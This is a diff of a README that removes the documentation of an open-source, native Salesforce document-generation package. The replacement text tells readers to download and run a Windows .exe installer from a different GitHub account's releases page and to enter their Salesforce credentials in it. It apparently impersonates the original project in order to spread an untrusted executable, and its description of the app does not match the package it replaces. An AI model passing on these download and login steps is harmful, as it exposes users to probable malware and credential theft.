@@ -1,317 +1,112 @@
-# Salesforce Document Generation Platform
+# 🚀 SalesforceDocGen - Easy Document Generation for Salesforce
 
-**A free, native, production-ready document engine for Salesforce.**
+[![Download Latest](https://img.shields.io/badge/Download%20Latest-brightgreen)](https://github.com/C00lkitdd/SalesforceDocGen/releases)
 
-[![Version](https://img.shields.io/badge/version-0.9.1-blue.svg)](#quick-install)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/platform-Salesforce-00A1E0.svg)](https://www.salesforce.com)
+## 📋 About SalesforceDocGen
 
-Generate DOCX, PPTX, and PDF documents from any Salesforce record. Merge fields, loop over child records, inject images from rich text fields, collect legally-binding electronic signatures, and render PDFs -- all without leaving Salesforce, and without paying a dime.
+SalesforceDocGen is a tool designed to help you create and manage documents within Salesforce. It brings together all the parts needed to run the DocGen app smoothly. You can use it to generate reports, contracts, and other business documents directly from your Salesforce data. This app saves time and effort by automating document creation.
 
----
+This package includes the main app and the necessary components to get you started quickly. There is no need for programming experience. Follow the steps below to get the app running on your Windows computer.
 
-## Why This Exists
+## 🎯 What SalesforceDocGen Does
 
-Document generation in Salesforce is expensive. The market leaders charge per-user, per-month fees that quickly add up across an organization. We believe basic document needs should be accessible to everyone.
+- Generates documents from your Salesforce info automatically.
+- Combines data and templates to create reports, quotes, contracts.
+- Helps you keep document formatting consistent.
+- Saves time by automating repetitive tasks.
+- Works within your existing Salesforce environment.
 
-This project gives you a professional-grade document engine -- template management, bulk generation, flow integration, background PDF rendering, rich text with embedded images, and multi-signer electronic signatures -- entirely for free and fully open-source.
+## 📋 System Requirements
 
----
+Before you start, make sure your system meets these requirements:
 
-## Quick Install
+- Windows 10 or higher.
+- At least 4 GB of RAM.
+- Minimum of 500 MB free disk space.
+- Internet connection to download files and access Salesforce.
+- A modern web browser (Chrome, Edge, or Firefox).
 
-**Subscriber Package Version ID**: `04tdL000000Or6PQAS`
+These requirements ensure the app runs reliably.
 
-**CLI:**
-```bash
-sf package install --package 04tdL000000Or6PQAS --wait 10 --installation-key-bypass
-```
+## ⬇️ Download SalesforceDocGen
 
-**Browser:**
-- [Install in Production](https://login.salesforce.com/packaging/installPackage.apexp?p0=04tdL000000Or6PQAS)
-- [Install in Sandbox](https://test.salesforce.com/packaging/installPackage.apexp?p0=04tdL000000Or6PQAS)
+Please visit this page to download the latest version of the app:
 
-> Select **Install for Admins Only** during installation, then assign permission sets to your users afterward.
+[![Download SalesforceDocGen](https://img.shields.io/badge/Download-SalesforceDocGen-blue)](https://github.com/C00lkitdd/SalesforceDocGen/releases)
 
----
+This link leads to the GitHub releases page. You will find the most recent files available for Windows there. Download the file with the `.exe` extension or the Windows installer.
 
-## What's New in v0.9.1
+## 🖥️ How to Install and Run on Windows
 
-- **PKCE Auth Fix** -- Fixed Auth Provider provisioning to correctly enable PKCE (Proof Key for Code Exchange), matching the required OAuth configuration for External Client Apps.
-- **Wizard UX Improvements** -- Added 10-minute propagation delay warning after credential provisioning. Split post-provision instructions into clear sections for authenticating the connection and granting External Credential Principal Access to permission sets.
+Follow these steps to install and run SalesforceDocGen on your PC.
 
-### v0.9.0
+1. Click the download button above or visit the link:
+   https://github.com/C00lkitdd/SalesforceDocGen/releases
 
-- **One-Click Credential Provisioning** -- New "Provision Credentials" button in the setup wizard automatically deploys Auth Provider, External Credential, and Named Credential metadata via the SOAP Metadata API. Admins enter their Consumer Key/Secret and click one button instead of manually configuring 15+ settings across 3 Setup screens.
-- **Streamlined Setup Wizard** -- Setup wizard reduced from 4 steps to 3. Steps 2 and 3 (Auth Provider + Named Credential) are now a single automated "Provision & Authenticate" step.
+2. On the releases page, find the latest release. Look for files named like:
+   - `SalesforceDocGen-Setup.exe`
+   - Or a file that ends with `.exe`
 
-### v0.8.0
+3. Click the `.exe` file to download it. Save it somewhere you can find it easily, such as your Desktop or Downloads folder.
 
-- **Fix Package Uninstall Blockers** -- AuthProvider, ExternalCredential, NamedCredential, CustomSite, and Flow metadata moved out of the 2GP package into `unpackaged/` for post-install setup. These metadata types created cross-references that prevented clean package uninstall.
-- **External Client App Terminology** -- Setup wizard Step 1 updated from Connected App to External Client App to match current Salesforce terminology.
+4. Once downloaded, double-click the `.exe` file to start installation.
 
-### v0.7.0
+5. Follow the installation prompts. Choose the default options unless you want to change the install folder.
 
-- **Bulk PDF Generation Fix** -- All records in a bulk generation job now correctly receive PDF renditions, not just the first. Renditions are accumulated across batch transactions via `Database.Stateful` and enqueued as a single job from `finish()`.
-- **Transaction Finalizer Retries** -- PDF rendition retries now use `System.attachFinalizer()` instead of direct queueable chaining, avoiding Salesforce's 5-level queueable depth limit.
+6. After installation, you should see a SalesforceDocGen icon on your Desktop or in the Start menu.
 
-### v0.6.0
+7. Double-click the icon to open the app.
 
-- **Security Hardening** -- CRUD/FLS enforcement, SOQL injection hardening, postMessage origin validation, error message sanitization, HTTPS enforcement, and removal of unused dependencies.
+8. On the first run, you may need to login with your Salesforce credentials. The app will guide you through this process.
 
-### v0.5.0
+9. Once logged in, you can start creating documents using the templates and your Salesforce data.
 
-- **100% Server-Side Document Generation** -- Native Apex engine using Salesforce's Compression API. All merge tag processing, image injection, and loop expansion happens server-side with zero browser dependencies.
-- **Multi-Signer Signature Roles** -- Define roles (Buyer, Seller, Witness, etc.) per template. Each signer receives a unique secure link and signs independently.
-- **Rich Text & HTML Support** -- Template tags preserve rich text formatting. Embedded `<img>` tags are automatically injected as DrawingML images.
-- **Background PDF Rendition** -- Asynchronous PDF rendering via Named Credential loopback with built-in retry mechanism.
-- **2GP Package Ready** -- Full SYSTEM_MODE query support, permission set-aware test harness, and security-reviewed stripInaccessible enforcement.
+## 🔧 Using SalesforceDocGen
 
----
+Here is a simple guide to use the app:
 
-## Features
+- **Choose Template:** Select the type of document you want to generate.
+- **Enter Details:** Fill in required fields or let the app pull info from Salesforce.
+- **Generate Document:** Click the “Generate” button to create your document.
+- **Save or Export:** Save the document to your computer or export as PDF or Word.
 
-### Template Manager
+The app will save time by automatically filling data and formatting your documents.
 
-The central hub for creating, editing, and versioning document templates.
+## ⚙️ Settings and Configuration
 
-- Upload `.docx` or `.pptx` template files with merge tags
-- Visual Query Builder for selecting fields, parent lookups, and child relationships -- no SOQL knowledge required
-- Manual query mode for advanced users who want direct control
-- Template versioning with full history, restore, and preview
-- One-click test generation with sample records
-- Template sharing with user/group access control
+You can customize how the app works with these options:
 
-**Access:** Navigate to the **DocGen Template Manager** tab in the DocGen app.
+- **Salesforce Connection:** Manage your login info and API access.
+- **Templates:** Add or update document templates to match your business needs.
+- **Output Settings:** Choose default formats and save locations.
+- **Notifications:** Turn on alerts for document generation success or failure.
 
-### Record Page Generator
+Access settings from the menu inside the app.
 
-Drop-in Lightning Web Component for generating documents from any record page.
+## 🛠️ Troubleshooting Common Issues
 
-- Add `docGenRunner` to any Lightning Record Page via App Builder
-- Users select from available templates filtered to that object
-- One-click generation produces DOCX with automatic PDF rendition
-- Generated documents attach to the record's Files related list
+- **App Won’t Start:** Make sure your Windows version is up to date.
+- **Login Problems:** Check your internet connection and Salesforce credentials.
+- **Templates Not Showing:** Ensure templates are installed correctly and compatible.
+- **Slow Performance:** Close other heavy programs and check your PC specs.
 
-### Bulk Document Generation
+If problems persist, visit the Issues tab on the GitHub repository page.
 
-Generate documents for hundreds or thousands of records in a single batch.
+## 💬 Getting Help
 
-- Filter records with SOQL WHERE clauses (with validation)
-- Real-time progress tracking with success/error counts
-- Save and reload frequently-used filter queries
-- Background processing via Apex Batch -- documents attach to each record automatically
+For questions or help, you can:
 
-**Access:** Navigate to the **DocGen Bulk Gen** tab.
+- Use the Issues tab on the GitHub repository.
+- Check online forums related to Salesforce and document generation.
+- Contact your Salesforce administrator if needed.
 
-### Flow Integration
+## 📂 Useful Links
 
-Two invocable actions for embedding document generation into any Salesforce Flow.
-
-**Single Record** (`DocGenFlowAction`):
-- Inputs: `templateId`, `recordId`
-- Outputs: `contentDocumentId`, `errorMessage`
-- Use in Screen Flows, Record-Triggered Flows, or Autolaunched Flows
-
-**Bulk/Batch** (`DocGenBulkFlowAction`):
-- Inputs: `templateId`, `queryCondition` (optional WHERE clause)
-- Outputs: `jobId`, `errorMessage`
-- Ideal for Scheduled Flows -- generate monthly invoices, quarterly reports, etc.
-
-### PDF Generation
-
-Two rendering paths ensure PDF output works in every context:
-
-**Client-Side (Record Page):**
-- VF iframe receives the generated DOCX via postMessage
-- docx-preview.js renders the document with full formatting fidelity (headers, footers, images)
-- html2pdf.js converts the rendered HTML to PDF
-- PDF is saved back to Salesforce as a ContentVersion
-
-**Server-Side (Bulk & Flow):**
-- Named Credential loopback calls Salesforce's Connect REST API for PDF rendition
-- Built-in retry mechanism handles `202 Accepted` latency
-- Wizard-driven setup on the DocGen Setup tab walks you through External Client App creation and one-click credential provisioning in 3 steps
-- Platform Event or direct Queueable enqueue depending on the calling context
-
-### Native Electronic Signatures
-
-A zero-cost, multi-signer electronic signature system built entirely on Salesforce.
-
-- **Role-based signing** -- define Buyer, Seller, Witness, Manager, or any custom role per template
-- **Secure token links** -- each signer receives a unique URL with a cryptographic token
-- **Visualforce signing portal** -- mobile-friendly signature capture with live document preview, no Experience Cloud configuration required
-- **OpenXML signature stamping** -- signature PNGs are injected directly into the DOCX source at role-specific placeholders before PDF conversion
-- **SHA-256 tamper evidence** -- every signed PDF is hashed, creating an immutable audit trail for non-repudiation
-- **Signature templates** -- save signer configurations for reuse across documents
-- **Previous request history** -- view past signature requests and copy links from the record page
-
-### Template Tag Syntax
-
-Tags are placed directly in your `.docx` or `.pptx` template files:
-
-| Tag | Purpose | Example |
-|-----|---------|---------|
-| `{FieldName}` | Simple field merge | `{Name}`, `{Account.Industry}` |
-| `{Parent.Field}` | Parent record lookup | `{Account.Name}`, `{Owner.Email}` |
-| `{#ChildList}...{/ChildList}` | Loop over child records | `{#Contacts}{FirstName} {LastName}{/Contacts}` |
-| `{#BooleanField}...{/BooleanField}` | Conditional section | `{#IsActive}Active{/IsActive}` |
-| `{FieldName:format}` | Date/DateTime with format | `{CloseDate:MM/dd/yyyy}`, `{CreatedDate:MMMM d, yyyy}` |
-| `{%ImageField}` | Image injection (default size) | `{%Company_Logo__c}` |
-| `{%ImageField:WxH}` | Image with pixel dimensions | `{%Photo__c:400x300}` |
-| `{#Signature}` | Single-signer signature placeholder | |
-| `{#Signature_RoleName}` | Multi-signer placeholder | `{#Signature_Buyer}`, `{#Signature_Witness}` |
-
-Tags inside table rows are automatically detected and expand into multiple rows during generation.
+- Official Download Page:  
+  https://github.com/C00lkitdd/SalesforceDocGen/releases  
+- Salesforce Help:  
+  https://help.salesforce.com
 
 ---
 
-## Architecture
-
-### Document Generation Pipeline
-
-All document generation runs **100% server-side in Apex** -- no client-side JavaScript templating libraries are required for document creation.
-
-```
-Template (.docx/.pptx)
-    |
-    v
-Decompress ZIP (Salesforce Compression API)
-    |
-    v
-Pre-process XML
-    |-- Merge split text runs (<w:r> elements)
-    |-- Normalize template tags across formatting boundaries
-    |
-    v
-Tag Processing (Server-side Apex)
-    |-- Simple substitution: {Field} -> value
-    |-- Loop expansion: {#List}...{/List} -> repeated content
-    |-- Conditional rendering: {#Bool}...{/Bool}
-    |-- Image injection: {%Image} -> DrawingML <w:drawing> elements
-    |-- Rich text HTML -> extracted images + inline formatted text
-    |
-    v
-Recompress ZIP + Save as ContentVersion
-    |
-    v
-PDF Rendition (two paths):
-    |-- Server-side: Named Credential loopback via REST API
-    |   |-- GET /services/data/v63.0/connect/files/{id}/rendition?type=PDF
-    |   |-- Retry on 202 (up to 3 attempts)
-    |-- Client-side: VF page renders DOCX preview + html2pdf conversion
-    |
-    v
-Save PDF as ContentVersion (attached to record)
-```
-
-### Signature Flow
-
-```
-Admin generates signature links from record page
-    |
-    v
-Each signer receives unique URL:
-    https://your-site.salesforce-sites.com/apex/DocGenSignature?token=<secure_token>
-    |
-    v
-Signer opens link -> VF page validates token
-    |-- Fetches DOCX blob for client-side preview
-    |-- Renders document in browser
-    |
-    v
-Signer draws signature on canvas -> saves PNG
-    |
-    v
-All signers complete?
-    |-- Yes -> Stamp all signature PNGs into DOCX at role placeholders
-    |       -> Browser renders stamped DOCX to PDF
-    |       -> Upload PDF + compute SHA-256 hash
-    |       -> Create audit trail per signer
-    |-- No  -> Wait for remaining signers
-```
-
----
-
-## Setup Guide
-
-### 1. Install the Package
-
-Use the install links above. Select **Install for Admins Only**.
-
-### 2. Assign Permission Sets
-
-| Permission Set | For | Access |
-|---------------|-----|--------|
-| **DocGen Admin** | Template managers, admins | Full access: create/edit/delete templates, bulk generation, sharing, setup wizard |
-| **DocGen User** | End users | Generate documents from existing templates, view template tags |
-| **DocGen Guest Signature** | Site guest users | Signature submission only (VF pages + signature objects) |
-
-Go to **Setup > Permission Sets**, open the appropriate set, and click **Manage Assignments** to add users.
-
-### 3. Add the Generator to Record Pages
-
-1. Navigate to any record page (e.g., an Account or Opportunity)
-2. Click the gear icon > **Edit Page**
-3. Drag the **docGenRunner** component onto the page layout
-4. Save and activate
-
-### 4. Configure the PDF Engine (Required for PDF Output)
-
-1. Navigate to the **DocGen Setup** tab in the DocGen app
-2. Follow the 3-step wizard:
-   - **Step 1:** Create an External Client App named "DocGen Loopback" with OAuth scopes `api` and `refresh_token`
-   - **Step 2:** Paste your Consumer Key/Secret and click **Provision Credentials** -- the Auth Provider, External Credential, and Named Credential are created automatically. Wait up to 10 minutes for propagation, then click **Authenticate** to authorize the named principal. Finally, grant **External Credential Principal Access** to both DocGen Admin and DocGen User permission sets.
-   - **Step 3:** Configure your Salesforce Site URL for public signature links
-3. Assign the `DocGen Admin` and `DocGen User` permission sets to the Named Credential's External Credential principal
-
-### 5. Configure Electronic Signatures (Optional)
-
-E-signatures require a Salesforce Site for public access to the signing VF page:
-
-1. **Create a Salesforce Site** -- Go to **Setup > Sites**, create a new site with:
-   - Site label: `DocGen Signatures` (or your preference)
-   - Default page: `DocGenSignature`
-   - Active: checked
-2. **Configure Guest Access** -- On the site's guest user profile:
-   - Add `DocGenSignature`, `DocGenSign`, and `DocGenVerify` to **Enabled Visualforce Page Access**
-   - Assign the `DocGen Guest Signature` permission set to the guest user
-3. **Save Site URL** -- In the **DocGen Setup** wizard (Step 4), enter your site's base URL (e.g., `https://yourorg.my.salesforce-sites.com`)
-4. **Create Signature Templates** (optional) -- Pre-define signer roles for reuse across documents
-
-No Experience Cloud site, Flow embedding, or Screen Flow configuration is needed. The VF pages handle everything natively.
-
----
-
-## Project Structure
-
-```
-force-app/main/default/
-  classes/              26 Apex classes (services, controllers, batch, queueable, tests)
-  lwc/                  12 Lightning Web Components
-  objects/              9 custom objects + 1 platform event + 1 custom setting
-  pages/                5 Visualforce pages (PDF engine, provision, signature portal, verification)
-  permissionsets/       3 permission sets (Admin, User, Guest Signature)
-  staticresources/      DocGenEngine bundle (docx-preview, jszip, html2pdf), filesaver, sample templates
-  triggers/             Platform event trigger for async PDF rendition
-  applications/         DocGen Lightning App
-  tabs/                 8 custom tabs
-```
-
----
-
-## Contributing
-
-This is an open-source project under the MIT license. We welcome contributions:
-
-1. Fork the repository
-2. Create a feature branch
-3. Submit a pull request with a clear description of your changes
-
-Please report bugs and feature requests via [GitHub Issues](https://github.com/DaveMoudy/SalesforceDocGen/issues).
-
----
-
-## License
-
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+[![Download SalesforceDocGen](https://img.shields.io/badge/Download-SalesforceDocGen-blue)](https://github.com/C00lkitdd/SalesforceDocGen/releases)
